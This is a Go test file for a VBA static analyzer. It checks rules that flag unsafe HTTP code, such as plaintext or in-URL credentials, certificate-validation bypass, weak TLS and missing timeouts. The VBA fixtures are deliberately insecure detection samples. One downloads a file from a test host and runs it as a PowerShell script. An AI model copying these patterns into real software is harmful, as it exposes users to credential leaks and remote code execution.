package analyze

import (
	"encoding/json"
	"path/filepath"
	"strings"
	"testing"

	"github.com/harumiWeb/xlflow/internal/config"
)

func TestVBA246DetectsCredentialTransportEarlyAndLateBound(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const AUTH_HEADER As String = "Bearer production-secret-value"

Public Sub Run()
    Dim early As MSXML2.XMLHTTP60
    Dim late As Object
    Set early = New MSXML2.XMLHTTP60
    early.Open "GET", "http://api.example.test/private", False, "user", "password"
    early.Send

    Set late = CreateObject("WinHttp.WinHttpRequest.5.1")
    late.SetTimeouts 1000, 1000, 1000, 1000
    late.Open "GET", "http://api.example.test/token", False
    late.SetRequestHeader "Authorization", AUTH_HEADER
    late.Send
    Debug.Print AUTH_HEADER
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	want := map[string]bool{"plain_http_credentials": false, "sensitive_module_constant": false, "authorization_logging": false}
	for _, finding := range got {
		if finding.HTTPSecurity != nil {
			want[finding.HTTPSecurity.RiskKind] = true
		}
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(encoded), "production-secret-value") {
			t.Fatalf("VBA246 exposed secret: %s", encoded)
		}
	}
	for kind, seen := range want {
		if !seen {
			t.Fatalf("missing %s in %+v", kind, got)
		}
	}
}

func TestVBA246DetectsURLCredentialsTLSAndCertificateBypass(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://alice:secret@example.test/data", False
    request.Option(4) = 13056
    request.Option(9) = &H280
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	seen := map[string]bool{}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil {
			seen[finding.HTTPSecurity.RiskKind] = true
		}
	}
	for _, kind := range []string{"credentials_in_url", "certificate_validation_bypass", "obsolete_tls_protocol"} {
		if !seen[kind] {
			t.Fatalf("missing %s: %+v", kind, findings)
		}
	}
}

func TestVBA247RequiresFiniteTimeoutOnEveryPath(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal configure As Boolean, ByVal dynamicTimeout As Long)
    Dim request As MSXML2.ServerXMLHTTP60
    Set request = New MSXML2.ServerXMLHTTP60
    If configure Then
        request.setTimeouts 1000, 1000, 1000, 1000
    End If
    request.Open "GET", "https://example.test", False
    request.Send

    Dim dynamicRequest As Object
    Set dynamicRequest = CreateObject("WinHttp.WinHttpRequest.5.1")
    dynamicRequest.SetTimeouts dynamicTimeout, dynamicTimeout, dynamicTimeout, dynamicTimeout
    dynamicRequest.Open "GET", "https://example.test", False
    dynamicRequest.Send

    Dim xhr As MSXML2.XMLHTTP60
    Set xhr = New MSXML2.XMLHTTP60
    xhr.Open "GET", "https://example.test", False
    xhr.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.API != "MSXML2.ServerXMLHTTP" {
		t.Fatalf("VBA247 findings = %+v", got)
	}
}

func TestVBA246HonorsDevelopmentOriginsButNeverURLCredentials(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://dev.example.test:8080", False
    request.SetCredentials "user", "password", 0
    request.Send
    request.Open "GET", "http://user:password@localhost/private", False
    request.Send
End Sub
`)
	cfg := config.Default()
	cfg.Analyze.DevelopmentHTTPOrigins = []string{"http://dev.example.test:8080"}
	findings, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	if len(got) != 1 || got[0].HTTPSecurity == nil || got[0].HTTPSecurity.RiskKind != "credentials_in_url" {
		t.Fatalf("development findings = %+v", got)
	}
}

func TestVBA246DetectsHTTPDownloadAndExecute(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Const target As String = "C:\\Temp\\payload.ps1"
    Dim request As Object
    Dim stream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    stream.Write request.ResponseBody
    stream.SaveToFile target, 2
    Shell "powershell.exe -File " & target
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	found := false
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			found = true
		}
	}
	if !found {
		t.Fatalf("missing download_and_execute: %+v", findings)
	}
}

func TestVBA246RealtimeAndSuppressions(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	source := []byte(`Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://user:password@example.test", False ' xlflow:disable-line VBA246
    request.Send
End Sub
`)
	findings, err := SourceRealtimeFindings(dir, filepath.Join(dir, "src", "modules", "Main.bas"), config.Default(), source)
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("suppressed realtime findings = %+v", got)
	}
}

func TestHTTPRulesIgnoreUnrelatedObjectsAndSafeTLS(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    request.Open "GET", "http://user:password@example.test", False
    request.Send

    Dim http As Object
    Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
    http.SetTimeouts 1000, 1000, 1000, 1000
    http.Open "GET", "https://example.test", False
    http.Option(4) = 0
    http.Option(9) = &H2800
    http.Send

    Dim lookedUp As Object
    Set lookedUp = Lookup("WinHttp.WinHttpRequest.5.1")
    lookedUp.Open "GET", "https://user:password@example.test", False
    lookedUp.Send

    Dim adapter As ExampleWinHttp.WinHttpRequestAdapter
    adapter.Open "GET", "https://user:password@example.test", False
    adapter.Send

    Dim company As Object
    Set company = CreateObject("Company.WinHttpRequest.5.1Adapter")
    company.Open "GET", "https://user:password@example.test", False
    company.Send
End Sub

Private Function Lookup(ByVal name As String) As Collection
    Set Lookup = New Collection
End Function
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := append(findingsByCode(findings, "VBA246"), findingsByCode(findings, "VBA247")...); len(got) != 0 {
		t.Fatalf("unrelated/safe findings = %+v", got)
	}
}

func TestVBA247ClassifiesExplicitUnboundedTimeout(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    request.setTimeouts 0, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "unbounded" {
		t.Fatalf("unbounded timeout findings = %+v", got)
	}
}

func TestVBA246ResolvesAliasesAndServerXMLCertificateOptions(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal runtimeValue As Long)
    Dim original As New MSXML2.ServerXMLHTTP60
    Dim request As Object
    Set request = original
    request.setOption 2, 13056
    request.setOption 2, runtimeValue
    request.setTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	got := findingsByCode(findings, "VBA246")
	if len(got) != 1 || got[0].HTTPSecurity == nil || got[0].HTTPSecurity.RiskKind != "certificate_validation_bypass" || got[0].HTTPSecurity.API != "MSXML2.ServerXMLHTTP" {
		t.Fatalf("alias/server XML findings = %+v", got)
	}
}

func TestVBA246SensitiveModuleConstantRequiresSecretEvidence(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Private Const HEADER_NAME As String = "Authorization"
Private Const PLACEHOLDER As String = "<token>"
Private Const AUTH_VALUE As String = "Bearer actual-production-token"

Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test", False
    request.SetRequestHeader HEADER_NAME, PLACEHOLDER
    request.SetRequestHeader HEADER_NAME, AUTH_VALUE
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	count := 0
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "sensitive_module_constant" {
			count++
		}
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		if strings.Contains(string(encoded), "actual-production-token") {
			t.Fatalf("VBA246 exposed secret: %s", encoded)
		}
	}
	if count != 1 {
		t.Fatalf("sensitive module constant count = %d, findings = %+v", count, findings)
	}
}

func TestVBA246DownloadAndExecuteNegativeCases(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim stream As ADODB.Stream
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "https://example.test/payload", False
    request.Send
    Set stream = New ADODB.Stream
    stream.Write request.ResponseBody
    stream.SaveToFile "C:\Temp\saved-only.exe", 2
    Shell "C:\Temp\saved-only.exe.backup"
    stream.SaveToFile "C:\Temp\payload.txt", 2
    Shell "C:\Temp\payload.txt"
    stream.Write localBytes
    stream.SaveToFile "C:\Temp\overwritten.ps1", 2
    Shell "C:\Temp\overwritten.ps1"

    stream.Write request.ResponseBody
    stream.SaveToFile "C:\Temp\not-a-launcher.exe", 2
    Dim unrelated As Collection
    unrelated.Run "C:\Temp\not-a-launcher.exe"
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "download_and_execute" {
			t.Fatalf("unexpected download_and_execute: %+v", finding)
		}
	}
}

func TestVBA224FallbackWhenVBA246IsDisabled(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim token As String
    Dim request As Object
    token = InputBox("Token")
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://api.example.test", False
    request.SetRequestHeader "Authorization", token
    request.Send
End Sub
`)
	cfg := config.Default()
	cfg.Analyze.DetectUnsafeHTTPConfiguration = false
	findings, err := (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("disabled VBA246 findings = %+v", got)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) == 0 {
		t.Fatalf("missing VBA224 fallback: %+v", findings)
	}
	cfg.Analyze.DetectUnsafeHTTPConfiguration = true
	findings, err = (Analyzer{RootDir: dir, Config: cfg}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
		t.Fatalf("missing specialized VBA246: %+v", findings)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) != 0 {
		t.Fatalf("VBA224 must be suppressed for the specialized header flow: %+v", got)
	}
}

func TestVBA246IgnoresCredentialsInNonHTTPURL(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "ftp://user:password@example.test/file", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("non-HTTP URL findings = %+v", got)
	}
}

func TestVBA224SuppressionKeepsIndependentColonSeparatedFlow(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Dim other As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", "http://api.example.test", False
    request.SetRequestHeader "Authorization", "Bearer production-token": other.SetRequestHeader "X-Test", InputBox("value")
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) == 0 {
		t.Fatalf("missing specialized VBA246: %+v", findings)
	}
	if got := findingsByCode(findings, "VBA224"); len(got) == 0 {
		t.Fatalf("independent colon-separated VBA224 flow was suppressed: %+v", findings)
	}
}

func TestHTTPFindingsAlwaysRedactNeighboringCredentials(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.Open "GET", "https://alice:production-secret@example.test/private?token=secret", False
    request.Option(4) = 13056
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		encoded, err := json.Marshal(finding)
		if err != nil {
			t.Fatal(err)
		}
		for _, secret := range []string{"production-secret", "/private", "token=secret"} {
			if strings.Contains(string(encoded), secret) {
				t.Fatalf("HTTP finding exposed %q: %s", secret, encoded)
			}
		}
	}
}

func TestVBA247ExceptionalSetTimeoutPathRemainsMissing(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    On Error GoTo TimeoutFailed
    request.SetTimeouts 1000, 1000, 1000, 1000
    Exit Sub
TimeoutFailed:
    request.Open "GET", "https://example.test", False
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA247"); len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
		t.Fatalf("exceptional timeout findings = %+v", got)
	}
}

func TestVBA246DropsConflictingBranchConstants(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run(ByVal useHTTP As Boolean)
    Dim target As String
    Dim request As Object
    If useHTTP Then
        target = "http://api.example.test"
    Else
        target = "https://api.example.test"
    End If
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    request.SetTimeouts 1000, 1000, 1000, 1000
    request.Open "GET", target, False
    request.SetCredentials "user", "password", 0
    request.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	for _, finding := range findingsByCode(findings, "VBA246") {
		if finding.HTTPSecurity != nil && finding.HTTPSecurity.RiskKind == "plain_http_credentials" {
			t.Fatalf("conflicting URL branch must be unknown: %+v", finding)
		}
	}
}

func TestHTTPObjectReassignmentInvalidatesTypeAndAliasState(t *testing.T) {
	t.Parallel()
	dir := t.TempDir()
	writeModule(t, dir, "Main.bas", `Attribute VB_Name = "Main"
Option Explicit
Public Sub Run()
    Dim request As Object
    Set request = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set request = New Collection
    request.Open "GET", "https://user:password@example.test", False
    request.Send

    Dim current As Object
    Dim oldAlias As Object
    Set current = CreateObject("WinHttp.WinHttpRequest.5.1")
    Set oldAlias = current
    Set current = CreateObject("WinHttp.WinHttpRequest.5.1")
    current.SetTimeouts 1000, 1000, 1000, 1000
    oldAlias.Open "GET", "https://example.test", False
    oldAlias.Send
End Sub
`)
	findings, err := (Analyzer{RootDir: dir, Config: config.Default()}).Run()
	if err != nil {
		t.Fatal(err)
	}
	if got := findingsByCode(findings, "VBA246"); len(got) != 0 {
		t.Fatalf("reassigned unrelated receiver findings = %+v", got)
	}
	got := findingsByCode(findings, "VBA247")
	if len(got) != 1 || got[0].HTTPReliability == nil || got[0].HTTPReliability.TimeoutState != "missing" {
		t.Fatalf("reassigned alias timeout findings = %+v", got)
	}
}
